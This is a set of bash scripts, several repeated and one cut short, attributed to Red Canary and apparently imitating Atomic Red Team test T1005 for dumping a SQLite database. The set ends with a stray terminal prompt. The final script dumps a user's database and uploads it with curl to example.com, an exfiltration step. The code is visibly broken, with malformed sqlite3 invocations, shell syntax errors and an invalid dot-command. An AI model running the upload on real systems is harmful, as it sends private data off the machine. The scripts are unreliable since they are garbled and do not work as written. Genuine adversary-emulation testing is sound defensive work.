# SQLite Dump Script
# Author: Red Canary
# Version: 1.0

# Check if the database file exists
if [! -f "gta.db" ]; then
  echo "Error: Database file 'gta.db' not found."
  exit 1
fi

# Dump the database
sqlite3 gta.db.dump > gta_dump.sql

# Print the dump to the console
cat gta_dump.sql

# Save the dump to a file
echo "Dump saved to gta_dump.sql"

#!/bin/bash
# SQLite dump script
# Author: Red Canary
# Version: 1.0
# Description: This script will dump the contents of a SQLite database to a file.
# Usage: sqlite3 database.db.dump > output.sql

# Check if sqlite3 is installed
if! command -v sqlite3 &> /dev/null; then
  echo "Error: sqlite3 is not installed."
  exit 1
fi

# Check if a database file is provided
if [ -z "$1" ]; then
  echo "Error: No database file provided."
  exit 1
fi

# Dump the database
sqlite3 "$1".dump > output.sql

#!/bin/bash

# SQLite dump script
# Author: Red Canary

# Set the database file
DB_FILE="gta.db"

# Dump the database
sqlite3 "$DB_FILE".dump > "$DB_FILE.sql"

# Print the database contents
echo "Database contents:"
sqlite3 "$DB_FILE" ".headers on" ".mode column" ".mode csv" ".output /dev/stdout" ".all"

# Print the database schema
echo "Database schema:"
sqlite3 "$DB_FILE" ".schema"

#!/bin/bash

# SQLite dump script
# Author: Red Canary

# Set the database file
DB_FILE="gta.db"

# Dump the database
sqlite3 "$DB_FILE".dump > "$DB_FILE.sql"

# Print the database contents
echo "Database contents:"
sqlite3 "$DB_FILE" ".headers on" ".mode column" ".mode csv" ".output /dev/stdout" ".all"

# Print the database schema
echo "Database schema:"
sqlite3 "$DB_FILE" ".schema"

#!/bin/bash
# Atomic Test Name: T1005
# Atomic Test Description: SQLite Database Dump
# Atomic Test Type: Attack
# Atomic Test Purpose: This atomic test demonstrates the ability to dump a SQLite database.
# Atomic Test Configuration:
#   * The test assumes that the SQLite database is located at /home/chris/gta.db
#   * The test assumes that the SQLite database has a table named "users" with a column named "username"
# Atomic Test Steps:
#   1. Dump the SQLite database to a file named "dump.sql"
#   2. Print the contents of the dump file to the console
# Atomic Test Remediation:
#   * Ensure that the SQLite database is properly secured and access is restricted to authorized personnel
#   * Regularly review and update the database schema to ensure that sensitive information is not stored in plaintext
#   * Consider using a more secure database management system, such as PostgreSQL or MySQL

# Dump the SQLite database to a file named "dump.sql"
sqlite3 /home/chris/gta.db.dump > dump.sql

# Print the contents of the dump file to the console
cat dump.sql

#!/bin/bash
# Atomic Test Name: T1005
# Atomic Test Description: SQLite Database Dump
# Atomic Test Type: Attack
# Atomic Test Purpose: This atomic test demonstrates the ability to dump a SQLite database.
# Atomic Test Configuration:
#   * The test assumes that the SQLite database is located at /home/chris/gta.db
#   * The test assumes that the SQLite database has a table named "users" with a column named "username"
# Atomic Test Steps:
#   1. Dump the SQLite database to a file named "dump.sql"
#   2. Print the contents of the dump file to the console

#   * Ensure that the SQLite database is properly secured and access is restricted to authorized personnel
#   * Regularly review and update the database schema to ensure that sensitive information is not stored in plaintext
#   * Consider using a more secure database management system, such as PostgreSQL or MySQL

#!/bin/bash
# SQLite Dump
# Atomic Test Name: SQLite Dump
# Atomic Test ID: T1005
# Atomic Test Description:
#   This atomic test demonstrates the ability to dump the contents of a SQLite database.
#   This can be used to exfiltrate sensitive data from a system.
#   The test uses the sqlite3 command to dump the contents of the database to a file.
#   The file is then uploaded to a remote server using curl.
# Atomic Test Output:
#   The contents of the SQLite database will be dumped to a file and uploaded to a remote server.
#   The file will be named "sqlite_dump.sql".
# Atomic Test Requirements:
#   The system must have the sqlite3 command installed.
#   The system must have the curl command installed.
#   The system must have network access to the remote server.
# Atomic Test Script:
sqlite3 /home/chris/gta.db.dump > sqlite_dump.sql
curl -T sqlite_dump.sql https://example.com/sqlite_dump.sql
# Atomic Test Remediation:
#   The SQLite database should be removed or secured.
#   The sqlite_dump.sql file should be removed or secured.
# Atomic Test Version: 1.0
# Atomic Test Created by: Red Canary
# Atomic Test Modified by: Red Canary
# Atomic Test Last Modified: 2022-02-22 14:30:00
chris@speedlab-ml-3:~$
